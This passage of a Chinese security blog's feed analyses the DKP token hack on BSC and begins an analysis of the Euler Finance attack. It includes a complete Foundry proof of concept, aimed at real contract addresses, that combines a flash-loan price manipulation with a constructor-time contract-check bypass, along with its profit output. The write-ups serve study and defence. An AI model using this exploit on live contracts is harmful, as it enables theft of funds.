href=&#34;https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x55d398326f99059fF775485246999027B3197955 &lt;/a&gt; : BUSD&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19&lt;/a&gt;  : DKP token&lt;/p&gt;&#xA;&lt;p&gt;也就是说&lt;code&gt;0x1201()&lt;/code&gt;函数,  查询了 PancakeSwapV2 上的一个PAIR的 BUSD 和 DKP 余额, 然后将余额相除并返回. 继续研究代码发现&lt;code&gt;exchange()&lt;/code&gt;函数就是用的这个&lt;code&gt;0x1201()&lt;/code&gt;函数进行的价格查询,以便将一定数量的美元换成DKP 给用户 (实际就是实现了一个买币函数)&lt;/p&gt;&#xA;&lt;p&gt;这就给了黑客价格操纵的机会.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;漏洞利用&#34;&gt;&lt;span&gt;漏洞利用&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;价格操纵&#34;&gt;&lt;span&gt;价格操纵&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e4%bb%b7%e6%a0%bc%e6%93%8d%e7%ba%b5&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;日常操作, 利用闪电贷在&lt;code&gt;0x1201()&lt;/code&gt;查询价格时用到的PAIR中借走绝大多数BUSD, 由于&lt;code&gt;0x1201()&lt;/code&gt;是按照PAIR中BUSD和DKP的余额比例来计算价格的, 这就可以让其计算出DKP token价格异常&amp;quot;便宜&amp;quot;(并不是让市场上的价格变便宜, 而是让&lt;code&gt;0x1201()&lt;/code&gt;计算出一个错误的很便宜的价格), 然后攻击者就可以用少量的BUSD进行大量买入. 然后再到市场上以正常的价格卖出而获利.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;绕过合约检查&#34;&gt;&lt;span&gt;绕过合约检查&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e7%bb%95%e8%bf%87%e5%90%88%e7%ba%a6%e6%a3%80%e6%9f%a5&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;由于&lt;code&gt;exchange&lt;/code&gt;函数中  &lt;code&gt;require(msg.sender.code.size &amp;lt;= 0, Error(&#39;no isContract&#39;));&lt;/code&gt; 条件的限制, 攻击合约是不能直接调用&lt;code&gt;exchange&lt;/code&gt;函数的.&lt;/p&gt;&#xA;&lt;p&gt;但是, 使用代码size是否为0来作为调用是否来自合约的判断条件是有问题的. 合约在&amp;quot;run time&amp;quot;时代码size是大于0的,但在&amp;quot;creation time&amp;quot;,由于合约还正在部署过程中,所以其code size这时为0, 要在&amp;quot;creation time&amp;quot;执行代码逻辑,那自然就是合约的构造函数, 所以在合约的构造函数中调用&lt;code&gt;exchange&lt;/code&gt;函数是可以绕过上面的条件检查的. 关于这个问题可以参考 &lt;a href=&#34;https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/15_GatekepperTwo.md&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Ethernaut第15个挑战题目&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;另外一个问题是,  调用&lt;code&gt;exchange&lt;/code&gt;需要钱(去买DKP), 如何在合约还没部署完成时向合约转账,让它有钱呢.&lt;/p&gt;&#xA;&lt;p&gt;所以需要事先知道合约的地址, 向其转账,然后再部署合约,部署合约时再其构造函数中进行&lt;code&gt;exchange&lt;/code&gt;调用.&lt;/p&gt;&#xA;&lt;p&gt;这就需要用到Create2: &lt;a href=&#34;https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;POC&lt;/span&gt;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;&#xA;interface IERC20 {&#xA;    function balanceOf(address owner) external view returns (uint256);&#xA;&#xA;    function approve(address spender, uint256 value) external returns (bool);&#xA;&#xA;    function transfer(address to, uint256 value) external returns (bool);&#xA;&#xA;    function decimals() external view returns (uint8);&#xA;}&#xA;&#xA;interface IUniswapV2Pair {&#xA;    function swap(&#xA;        uint256 amount0Out,&#xA;        uint256 amount1Out,&#xA;        address to,&#xA;        bytes calldata data&#xA;    ) external;&#xA;}&#xA;&#xA;interface IRouter {&#xA;    function swapExactTokensForTokensSupportingFeeOnTransferTokens(&#xA;        uint256 amountIn,&#xA;        uint256 amountOutMin,&#xA;        address[] calldata path,&#xA;        address to,&#xA;        uint256 deadline&#xA;    ) external;&#xA;}&#xA;&#xA;interface IDKPExchange {&#xA;    function exchange(uint256 amount) external;&#xA;}&#xA;&#xA;IERC20 constant DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);&#xA;IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);&#xA;IUniswapV2Pair constant Pair = IUniswapV2Pair(&#xA;    0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7&#xA;);&#xA;IRouter constant Router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);&#xA;IDKPExchange constant DKPExchange = IDKPExchange(&#xA;    0x89257A52Ad585Aacb1137fCc8abbD03a963B9683&#xA;);&#xA;&#xA;contract RunAsNotContract {&#xA;    constructor() {&#xA;        BUSD.approve(address(DKPExchange), type(uint256).max);&#xA;        DKPExchange.exchange(100 * 10 ** BUSD.decimals());&#xA;        BUSD.approve(address(DKPExchange), 0);&#xA;        DKP.transfer(msg.sender, DKP.balanceOf(address(this)));&#xA;    }&#xA;}&#xA;&#xA;contract Hack is Test {&#xA;    uint256 flashAmount;&#xA;    bytes32 the_salt = bytes32(keccak256(&amp;#34;the_salt_string&amp;#34;));&#xA;&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;theNet&amp;#34;, 26284131);&#xA;        deal(address(BUSD), address(this), 1000 * 10 ** BUSD.decimals());&#xA;    }&#xA;&#xA;    function testHack() public {&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;BUSD balance at the beginning&amp;#34;,&#xA;            BUSD.balanceOf(address(this)),&#xA;            BUSD.decimals()&#xA;        );&#xA;&#xA;        //借走PAIR中的绝大部分BUSD，让DKP变得非常便宜&#xA;        flashAmount = caculateSwapAmount();&#xA;        Pair.swap(flashAmount, 0, address(this), abi.encode(flashAmount));&#xA;&#xA;        //兑换BUSD，贷款回调执行完成后再兑换，否则报错&amp;#34;Pancake: LOCKED&amp;#34;&#xA;        DKP2BUSD();&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;BUSD balance at the end&amp;#34;,&#xA;            BUSD.balanceOf(address(this)),&#xA;            BUSD.decimals()&#xA;        );&#xA;    }&#xA;&#xA;    function pancakeCall(address, uint256, uint256, bytes calldata) external {&#xA;        //不能直接调用,其判断了调用方是否是合约，其只允许EOA进行exchange&#xA;        //DKPExchange.exchange(xxx); // 报错： &amp;#34;no isContract&amp;#34;&#xA;        //use this:&#xA;        address calcultedAddress = calculteSpecialContractAddress();&#xA;        BUSD.transfer(calcultedAddress, 100 * 10 ** BUSD.decimals());&#xA;        RunAsNotContract c = new RunAsNotContract{salt: the_salt}(); // exploit in constructor&#xA;        assert(address(c) == calcultedAddress);&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;DKP balance&amp;#34;,&#xA;            DKP.balanceOf(address(this)),&#xA;            DKP.decimals()&#xA;        );&#xA;&#xA;        //还贷款&#xA;        uint256 returnAmount = (flashAmount * 10_000) / 9975 &amp;#43; 1000;&#xA;        BUSD.transfer(address(Pair), returnAmount);&#xA;    }&#xA;&#xA;    function caculateSwapAmount() private returns (uint256) {&#xA;        uint256 b = BUSD.balanceOf(address(Pair));&#xA;        emit log_named_decimal_uint(&amp;#34;BUSD balance of Pair&amp;#34;, b, BUSD.decimals());&#xA;&#xA;        uint256 a = (b * 9992) / 10000; // 99.92 %&#xA;        emit log_named_decimal_uint(&amp;#34;I will borrow out&amp;#34;, a, BUSD.decimals());&#xA;&#xA;        return a;&#xA;    }&#xA;&#xA;    function calculteSpecialContractAddress() private view returns (address) {&#xA;        address predictedAddress = address(&#xA;            uint160(&#xA;                uint(&#xA;                    keccak256(&#xA;                        abi.encodePacked(&#xA;                            bytes1(0xff),&#xA;                            address(this),&#xA;                            the_salt,&#xA;                            keccak256(&#xA;                                abi.encodePacked(&#xA;                                    type(RunAsNotContract).creationCode&#xA;                                )&#xA;                            )&#xA;                        )&#xA;                    )&#xA;                )&#xA;            )&#xA;        );&#xA;&#xA;        return predictedAddress;&#xA;    }&#xA;&#xA;    function DKP2BUSD() private {&#xA;        DKP.approve(address(Router), type(uint256).max);&#xA;        address[] memory path = new address[](2);&#xA;        path[0] = address(DKP);&#xA;        path[1] = address(BUSD);&#xA;        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(&#xA;            DKP.balanceOf(address(this)),&#xA;            0,&#xA;            path,&#xA;            address(this),&#xA;            block.timestamp&#xA;        );&#xA;        DKP.approve(address(Router), 0);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[PASS] testHack() (gas: 520036)&#xA;Logs:&#xA;  BUSD balance at the beginning: 1000.000000000000000000&#xA;  BUSD balance of Pair: 259605.445236391899433885&#xA;  I will borrow out: 259397.760880202785914337&#xA;  DKP balance: 17666.042408805118459861&#xA;  BUSD balance at the end: 81512.615981085813934882&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Euler Finance 黑客攻击分析</title>
      <link>https://yinhui1984.github.io/euler-finance-attack/</link>
      <pubDate>Wed, 22 Mar 2023 14:33:05 +0800</pubDate>
      <guid>https://yinhui1984.github.io/euler-finance-attack/</guid>
      <category domain="https://yinhui1984.github.io/categories/security/">Security</category>
      <description>&lt;p&gt;去中心化去审批化借贷平台Euler前端时间遭到最糟糕的一系列攻击。这里以以太坊主链&lt;a href=&#34;https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;16817996高度的一次攻击&lt;/a&gt;为例，看看这个黑客是如何利用其漏洞实施攻击并获利的&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;euler协议借贷简述&#34;&gt;&lt;span&gt;Euler协议借贷简述&lt;/span&gt;&#xA;  &lt;a href=&#34;#euler%e5%8d%8f%e8%ae%ae%e5%80%9f%e8%b4%b7%e7%ae%80%e8%bf%b0&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Euler协议实现的是有抵押的借贷， 用户将资产（比如DAI）抵押给平台，平台会发放该资产对应的eToken（比如eDAI）给用户，就像去赌场的时候给顾客换的筹码一样，顾客然后就可以去愉快地玩耍了，玩耍完成后再用eToken赎回抵押的资产（赢了可以赎回更多，输了赎回得更少）。但与赌场不同的是，Euler除了有表示筹码的eToken外，还有表示负债的dToken（比如dDAI）。&lt;/p&gt;&#xA;&lt;p&gt;比如，你有100个eToken, 20个dToken, 那么最终你可以销毁掉20个eToken (eToken.burn函数)，其在销毁20个eToken的同时，也会销毁掉对应20个dToken，最终你剩余80个eToken，用这80个eToken的去换回部分或更多的抵押资产。&lt;/p&gt;&#xA;&lt;p&gt;在Euler中没有传统的闪电贷，但有一个函数: eToken.mint() 该函数实现了和闪电贷相同的功能，你可以自己进行铸币，铸造完成后，你将收到一定数量的eToken 和 对应数量的 dToken(负债)。这实际上就是进行了一次借贷：你拥有了更多的eToken筹码了。 要成功退出借贷协议，你需要完成业务逻辑后，将你的负载清零，清零方式有多种，比如你可以burn eToken去消除负载，也可以花钱（比如使用DAI）调用repay函数去消除负债。&lt;/p&gt;&#xA;&lt;p&gt;在运行过程中， 你的每次资金操作Euler都会检查你的财务健康状况，所谓财务健康状况就是“资债平衡”，在你抵押资产时，并不是1:1给你eToken的，而是有一定比例，参考&lt;a href=&#34;https://docs.euler.finance/languages/white-paper-eng-chn#zhan-qi-yan-qi-liu-dong-xing-defer-liquidity&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;白皮书&lt;/a&gt; 这就形成了一定的安全区间，如果你的操作很可能使你的财务状况超过这个安全区间，你的财务操作会被revert, 以确保不形成坏账。&lt;/p&gt;&#xA;&lt;p&gt;根据白皮书：当 Euler 用户的风险调整后负债超过了风险调整后债务时，就会被认为“违约”了。一个借款人刚刚进入“违约”状态时依然有足额的抵押来偿付它的贷款，但是会有被调整到可能无法偿付贷款的风险。结果来说，为了防止他们违约，就可能会对他们进行清算。&lt;/p&gt;&#xA;&lt;p&gt;清算时债务会打折销售给清算者，当然你的资金也会转移给清算者。关键在这个打折，为了鼓励清算者，如果你违规得越厉害（健康分数越低）打折就越厉害。但实际情况是Eluer协议不会让你的财务健康状态太差，这很容易形成大额坏账，所以你每次的财务操作你都会检查你的财务健康状态，可能资不抵债就revert，也就是checkLiquidity函数&lt;/p&gt;&#xA;&lt;p&gt;示例代码&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// 省略接口定义&#xA;&#xA;// 违规测试&#xA;contract ViolatorTest is Test {&#xA;    uint256 constant initialFunding = 80000 ether;&#xA;&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;mainnet&amp;#34;, 16_817_995);&#xA;    }&#xA;&#xA;    function checkHealth(address _who) private {&#xA;        //第一个参数是清算者地址， 不能传自己，否则会报错： [FAIL. Reason: e/liq/self-liquidation]&#xA;        IEuler.LiquidationOpportunity memory returnData = Euler&#xA;            .checkLiquidation(address(0), _who, address(DAI), address(DAI));&#xA;&#xA;        emit log_named_decimal_uint(&amp;#34;healthScore&amp;#34;, returnData.healthScore, 18);&#xA;    }&#xA;&#xA;    function testViolate() public {&#xA;        deal(address(DAI), address(this), initialFunding);&#xA;&#xA;        DAI.approve(address(EulerLiquidation), type(uint256).max);&#xA;        eDAI.deposit(0, 10000 ether);&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i got  eDAI after eDAI.deposit&amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have dDAI after eDAI.deposit&amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        eDAI.mint(0, 50000 ether);&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have eDAI after eDAI.mint&amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have dDAI after eDAI.mint&amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        //扔掉一部分eDAI&#xA;        eDAI.transfer(address(0), 100 ether); // 成功&#xA;        &#xA;        //检查财务健康状况，小于1表示资不抵债&#xA;        checkHealth(address(this));&#xA;&#xA;        //-------------&#xA;        // //平账方式2选1&#xA;        // //1. 烧掉自己的和欠款数量(dDAI)相等的eDAI(如果还有那么多eDAI的话)&#xA;        // eDAI.burn(0, dDAI.balanceOf(address(this)));&#xA;        // //2.或花钱（DAI）平掉dDAI&#xA;        // // 如果抵押款不足以平账，自己又不主动平账，还想withdraw&#xA;        // // 会被判断违约 [FAIL. Reason: e/collateral-violation],执行逻辑会被revert&#xA;        dDAI.repay(0, dDAI.balanceOf(address(this)));&#xA;&#xA;        ////平账后赎回抵押（只能赎回一部分了，另外一部分被扔掉了）&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have eDAI after repay, i will withdraw them now&amp;#34;,&#xA;            eDAI.balanceOfUnderlying(address(this)) / 1 ether&#xA;        );&#xA;        eDAI.withdraw(0, eDAI.balanceOfUnderlying(address(this)));&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have eDAI at the end&amp;#34;,&#xA;            eDAI.balanceOfUnderlying(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have dDAI at the end&amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;i have DAI at the end&amp;#34;,&#xA;            DAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;i lost DAI in this game&amp;#34;,&#xA;            (initialFunding - DAI.balanceOf(address(this))) / 1 ether&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[PASS] testViolate() (gas: 568359)&#xA;Logs:&#xA;  i got  eDAI after eDAI.deposit 9784&#xA;  i have dDAI after eDAI.deposit 0&#xA;  i have eDAI after eDAI.mint 58704&#xA;  i have dDAI after eDAI.mint 50000&#xA;  healthScore: 1.123525638279678714&#xA;  i have eDAI after repay, i will withdraw them now 59897&#xA;  i have eDAI at the end 0&#xA;  i have dDAI at the end 0&#xA;  i have DAI at the end 79897&#xA;  i lost DAI in this game 102&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在上面的代码中，我抵押了10000个DAI，收到了9784个eDAI, 然后贷款50000个eDAI, 又扔掉了100个eDAI，由于我抵押收到的eDAI为9784个远大于我扔掉的100个，相当于我扔掉的是自己的钱，所以我这个“扔掉操作”通过了健康检查，扔掉以后健康分数同样很高（大于1表示健康，小于1表示不健康），虽然亏了钱，但在Euler看来这属于正常操作，成功退出了协议。&lt;/p&gt;&#xA;&lt;p&gt;相反的，如果我执行下面操作：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;//扔掉一部分eDAI&#xA;eDAI.transfer(address(0), 20000 ether); &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Compiler run successful&#xA;&#xA;Running 1 test for test/poc.t.sol:ViolatorTest&#xA;[FAIL. Reason: e/collateral-violation] testViolate() (gas: 522373)&#xA;Logs:&#xA;  i got  eDAI after eDAI.deposit 9784&#xA;  i have dDAI after eDAI.deposit 0&#xA;  i have eDAI after eDAI.mint 58704&#xA;  i have dDAI after eDAI.mint 50000&#xA;&#xA;Test result: FAILED. 0 passed; 1 failed; finished in 668.29ms&#xA;&#xA;Failing tests:&#xA;Encountered 1 failing test in test/poc.t.sol:ViolatorTest&#xA;[FAIL. Reason: e/collateral-violation] testViolate() (gas: 522373)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我试图扔掉20000个eToken, 大于我质押得到的9784个eDAI，以为着我不仅要扔掉自己钱，还要从贷款的50000个中扔掉一部分，这我造成我严重的资不抵债, 肯定是不能通过财务健康检查（流动性检查）,所以操作被revert了。&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;漏洞&#34;&gt;&lt;span&gt;漏洞&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;打开Euler官方的源代码, 以EToken为例: &lt;a href=&#34;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;其在各类财务操作中（比如&lt;a href=&#34;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol#L206&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;mint&lt;/a&gt;, &lt;a href=&#34;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol#L234&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;burn&lt;/a&gt;, &lt;a href=&#34;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol#L180&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;withdraw&lt;/a&gt;, &lt;a href=&#34;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol#L323&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;transfer&lt;/a&gt;等），都调用了&lt;code&gt;checkLiquidity();&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function withdraw(uint subAccountId, uint amount) external nonReentrant {&#xA;        (address underlying, AssetStorage storage assetStorage, address proxyAddr, address msgSender) = CALLER();&#xA;        address account = getSubAccount(msgSender, subAccountId);&#xA;&#xA;&#x9;&#x9;&#x9;&#x9;// ... &#xA;&#x9;&#x9;&#x9;&#x9;// ...&#xA;&#xA;        //!!! important !!!&#xA;        checkLiquidity(account);&#xA;&#xA;        logAssetStatus(assetCache);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关于流动性检查的算法参考代码:  &lt;a href=&#34;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/RiskManager.sol#L290&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/RiskManager.sol#L290&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;唯独在 &lt;code&gt;donateToReserves()&lt;/code&gt; 